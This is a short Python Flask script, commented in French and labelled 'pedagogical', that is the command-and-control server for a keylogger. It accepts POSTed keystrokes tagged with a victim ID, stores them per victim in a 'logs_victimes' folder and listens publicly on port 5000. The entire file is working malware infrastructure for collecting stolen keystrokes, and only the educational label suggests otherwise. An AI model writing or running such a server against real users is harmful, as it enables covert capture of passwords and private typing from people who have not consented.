#!/usr/bin/env python3
"""
Serveur pédagogique – réception des entrées clavier
"""

from flask import Flask, request, jsonify
import os
import json
from datetime import datetime

app = Flask(__name__)

LOG_DIR = "logs_victimes"
os.makedirs(LOG_DIR, exist_ok=True)

@app.route("/api/logs", methods=["POST"])
def receive_logs():
    try:
        data = request.get_json()
        victim_id = data["victim_id"]
        keys = data["keys"]

        # Sauvegarde dans un fichier JSON
        log_file = os.path.join(LOG_DIR, f"{victim_id}.log")
        with open(log_file, "a") as f:
            f.write(json.dumps(data) + "\n")

        print(f"[REÇU] {victim_id} | {len(keys)} touches")

        return jsonify({"status": "ok", "received": len(keys)})
    
    except Exception as e:
        return jsonify({"error": str(e)}), 400


@app.route("/")
def index():
    return """
    <h2>Serveur Keylogger Pédagogique</h2>
    <p>POST → /api/logs</p>
    <p>Les logs sont stockés dans /logs_victimes/ </p>
    """

if __name__ == "__main__":
    print("[*] Serveur pédagogique démarré sur port 5000…")
    app.run(host="0.0.0.0", port=5000)

